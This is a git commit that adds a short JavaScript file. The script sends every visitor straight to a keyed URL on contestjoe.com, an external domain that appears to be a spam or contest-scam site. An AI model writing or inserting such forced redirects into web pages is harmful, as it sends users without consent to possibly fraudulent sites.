04d6eb2fa564e621518335b6868a88a8bec83fd3
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2025-07-02 23:37:09 +0700

    Create akeadster1dr8langsung.js

---
+++ akeadster1dr8langsung.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://contestjoe.com/z2a928v4?key=ba5d7447db530b3357389c4c38ec6abc',
+
+  'https://contestjoe.com/z2a928v4?key=ba5d7447db530b3357389c4c38ec6abc',
+
+  'https://contestjoe.com/z2a928v4?key=ba5d7447db530b3357389c4c38ec6abc'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
